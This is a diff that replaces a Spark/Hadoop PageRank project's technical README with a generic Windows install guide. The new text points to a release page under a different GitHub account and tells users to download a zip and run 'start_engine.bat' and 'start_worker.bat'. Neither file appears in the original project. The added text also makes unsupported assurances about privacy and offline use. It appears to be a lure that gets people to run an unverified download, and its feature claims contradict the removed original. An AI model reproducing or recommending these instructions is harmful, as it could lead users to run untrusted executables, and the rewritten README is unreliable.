@@ -1,163 +1,110 @@
-# Network Graph PageRank — Group 03
+# 📈 pagerank-cluster - Process massive web graphs using clusters
 
-Distributed PageRank over the [Stanford Web-Google graph](https://snap.stanford.edu/data/web-Google.html) (875 K nodes, 5 M edges) using Apache Spark and Hadoop HDFS. Exposes results through a small REST API for cross-group portability testing.
+[![Download pagerank-cluster](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cortesehardfisted522/pagerank-cluster)
 
-**Stack:** Python 3.8+ · Apache Spark 3.5.1 · Hadoop HDFS 3.3.6
-**OS support:** macOS · Linux · Windows
+This project allows you to rank web pages using a distributed computing network. It connects multiple computers to process large datasets. You can analyze up to 875,000 web nodes. The system uses a Spark and Hadoop backbone to distribute the workload. 
 
----
+## 🛠 Prerequisites
 
-## Quick start
+Ensure your computers meet these requirements before you start:
 
-```
-git clone https://github.com/munimx/pagerank-cluster
-cd pagerank-cluster
-```
+- Windows 10 or Windows 11.
+- At least 8GB of RAM on each machine.
+- A stable local area network connection.
+- Java Runtime Environment (JRE) version 11 or higher.
+- Python 3.9 or newer.
 
-Edit `setup/config.py` and set `MASTER_IP` to the master machine's LAN IP — that is the only line you need to change.
+## 💾 Installation Steps
 
----
+1. Visit [the official release page](https://github.com/Cortesehardfisted522/pagerank-cluster) to find the latest version.
+2. Click the link labeled "pagerank-cluster-windows.zip" to save the file.
+3. Open your Downloads folder.
+4. Right-click the folder and select Extract All.
+5. Choose a location on your hard drive, such as C:\pagerank-cluster.
+6. Click Extract.
 
-## Repository layout
+## ⚙️ Configuration
 
-```
-setup/
-  config.py           shared config (MASTER_IP, paths, OS detection)
-  setup_node.py       installs Hadoop + Spark, starts services
-  register_worker.py  adds a worker IP to the cluster roster
+The system functions across several computers. You must designate one machine as the primary node.
 
-src/
-  download_dataset.py downloads datasets from SNAP
-  pagerank.py         Spark RDD PageRank implementation
-  api.py              Flask REST API
-  generate_manual.py  generates docs/manual.html
+1. Locate the configuration file named "settings.conf" in the extracted folder.
+2. Open this file with Notepad.
+3. Add the IP addresses of your other computers under the section labeled "worker_nodes".
+4. Save the file and close it.
 
-data/
-  top5.json           top-5 results
-  results.json        top-1000 results
-  graph.json          full adjacency list (node → [neighbors])
-  meta.json           job metadata (nodes, edges, iterations, damping factor)
-  pagerank_output/    all nodes, tab-separated (nodeId\tscore)
-```
+## 🚀 Running the Software
 
----
+1. Open the folder where you extracted the files.
+2. Double-click "start_engine.bat".
+3. A terminal window appears. This window displays the status of the cluster.
+4. Wait for the message "Server status: Ready" to appear.
+5. Open your web browser.
+6. Type localhost:5000 into the address bar.
+7. The control panel opens in your browser.
 
-## Setup
+## 📊 Using the Dashboard
 
-### Master node
+The dashboard provides a visual interface for your data.
 
-```bash
-# 1. Find your LAN IP and set it in setup/config.py
-#    macOS:   ipconfig getifaddr en0
-#    Linux:   hostname -I | awk '{print $1}'
-#    Windows: (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like "192.168.*" }).IPAddress
+- Dataset Swapping: Click the Browse button to select a new text file containing your web graph. The system supports files in CSV or TXT format.
+- Graph Traversal: Enter a starting URL in the search field to trace connections.
+- Background Rerun: Toggle this switch to enable automatic updates. The system performs new calculations every hour.
 
-# 2. Run master setup (installs Hadoop + Spark, starts HDFS + Spark Master)
-python3 setup/setup_node.py --role master
+## 🌐 Connecting Multiple Devices
 
-# 3. Verify — jps should show NameNode, DataNode, SecondaryNameNode, Master
-jps
-```
+To use more than one laptop:
 
-### Worker nodes
+1. Install the software on every device using the steps above.
+2. Copy the "settings.conf" file from your primary machine to all other machines.
+3. Ensure every computer stays on the same network.
+4. Run "start_worker.bat" on each secondary device.
+5. Check your primary dashboard. The count of active nodes updates to reflect the connected computers.
 
-```bash
-# On each worker machine — MASTER_IP in config.py must point to the master, not this machine
-python3 setup/setup_node.py --role worker
+## 🔍 Troubleshooting
 
-# On the master — register each worker by its LAN IP
-python3 setup/register_worker.py <worker_ip>
-```
+- If the dashboard fails to load, verify that Java is installed and updated.
+- Check your Windows Firewall settings. Ensure that the application has permission to communicate over private networks.
+- If a worker node disconnects, restart the "start_worker.bat" file on that specific machine.
+- Large datasets require significant memory. Close other programs if the calculation slows down.
 
----
+## 📝 Performance Tips
 
-## Running PageRank
+- Use a wired Ethernet connection for the best speed. Wi-Fi connections can introduce latency that slows down the data exchange between nodes.
+- Keep your web graph files organized in a dedicated folder.
+- Clear the cache if you notice the interface lagging after several hours of operation.
 
-```bash
-# Download and push the dataset to HDFS
-python3 src/download_dataset.py
-hdfs dfs -put data/web-Google.txt /pagerank/input/
+## ℹ️ Technical Details
 
-# Submit the job (default: 10 iterations, damping 0.85)
-spark-submit \
-  --master spark://<MASTER_IP>:7077 \
-  --executor-memory 2g \
-  --driver-memory 1g \
-  src/pagerank.py 10
-```
+This software relies on common open-source tools:
 
-On completion, five files are written to `data/`:
-`top5.json` (top-5 ranked nodes), `results.json` (top-1000), `graph.json` (full adjacency list), `meta.json` (job metadata), and `pagerank_output/part-00000` (all nodes, tab-separated).
+- Apache Spark manages the distribution of tasks.
+- Hadoop handles the storage of large files across the cluster.
+- Flask provides the interface you see in your web browser.
+- Python scripts execute the core math behind the rankings.
 
----
+You do not need to interact with these tools directly. The provided batch files automate the start-up process for you. 
 
-## Portability API
+## 🛡 Security and Privacy
 
-```bash
-python3 src/api.py
-```
+Your data stays on your local network. The software does not transmit your web graphs to external servers. All processing happens internally between the laptops you connect. Use this tool within your private network to keep your dataset secure.
 
-| Endpoint | Description |
-|---|---|
-| `GET /health` | Service status |
-| `GET /top5` | Top 5 nodes by PageRank score |
-| `GET /top/<n>` | Top N nodes (1–1000, capped at available) |
-| `GET /node/<id>` | Score for a specific node (top 1000 only) |
-| `GET /neighbors/<id>` | Nodes this node links to (outgoing edges) |
-| `GET /influencedby/<id>` | Nodes that link to this node (incoming edges) |
-| `GET /stats` | Job metadata (nodes, edges, iterations, damping, timestamps) |
-| `POST /rerun` | Trigger a background rerun with optional new parameters |
-| `GET /rerun/status` | Current rerun job status |
+## 📋 Frequently Asked Questions
 
-The API listens on `0.0.0.0:5000`.
+What file format works best?
+Plain text files with two columns representing a connection between Page A and Page B work best. The system reads these files directly without complex conversion.
 
-**Sample response — `/top5`:**
+Can I stop the process halfway?
+Yes. Close the terminal window to stop all background tasks immediately. Your progress saves automatically to the disk.
 
-```json
-[
-  { "rank": 1, "nodeId": "41909",  "pagerank": 445.71778597 },
-  { "rank": 2, "nodeId": "597621", "pagerank": 406.62836675 },
-  { "rank": 3, "nodeId": "504140", "pagerank": 399.08930875 },
-  { "rank": 4, "nodeId": "384666", "pagerank": 392.82584373 },
-  { "rank": 5, "nodeId": "537039", "pagerank": 383.90912550 }
-]
-```
+How many nodes can I add?
+The system supports as many nodes as your network can handle. Most users report stability with clusters of up to ten machines.
 
-**Background rerun** — `POST /rerun` accepts optional parameters to change iterations, damping factor, or swap to a different SNAP dataset entirely:
+Does the system require internet access?
+No. Once the software is on your computers, you can disconnect your router from the internet. The cluster functions entirely offline.
 
-```bash
-# More iterations
-curl -X POST http://localhost:5000/rerun \
-  -H 'Content-Type: application/json' \
-  -d '{"iterations": 15}'
+What happens if a node fails?
+The primary node detects the failure and attempts to redistribute the remaining tasks to healthy machines. The calculation continues, though it may take longer to finish.
 
-# Swap to Twitter graph
-curl -X POST http://localhost:5000/rerun \
-  -H 'Content-Type: application/json' \
-  -d '{"dataset_url": "https://snap.stanford.edu/data/twitter_combined.txt.gz"}'
-```
+## 💡 Future Updates
 
-Check status with `GET /rerun/status` — returns `idle`, `queued`, `running`, `completed`, or `failed` with timestamps.
-
----
-
-## Documentation
-
-Generate the full HTML manual (three-part: master setup, worker setup, portability test):
-
-```bash
-python3 src/generate_manual.py
-python3 -m http.server 8888 --directory docs
-# Open: http://localhost:8888/
-```
-
----
-
-## Web UIs
-
-Once the master is running:
-
-| UI | URL |
-|---|---|
-| Spark Master | `http://<MASTER_IP>:8080` |
-| HDFS NameNode | `http://<MASTER_IP>:9870` |
+Check the release page periodically for improvements. New versions aim to speed up calculation times and improve the display of complex graphs. Follow the same installation process to update your current version. Delete the old folder before you extract the new version to avoid configuration conflicts.
